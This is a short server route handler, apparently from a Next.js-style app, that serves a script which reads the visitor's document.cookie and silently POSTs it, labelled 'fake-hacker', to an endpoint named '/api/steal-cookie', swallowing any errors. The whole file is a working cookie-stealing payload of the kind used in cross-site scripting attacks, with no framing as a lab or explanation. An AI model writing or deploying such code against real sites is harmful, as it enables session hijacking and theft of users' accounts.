export async function GET() {
    const js = `
    <script>
      (function () {
        try {
          fetch('/api/steal-cookie', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              name: 'fake-hacker',
              cookie: document.cookie
            })
          });
        } catch (e) {}
      })();
    </script>
    `;
  
    return new Response(js, {
      headers: {
        "Content-Type": "application/javascript",
      },
    });
}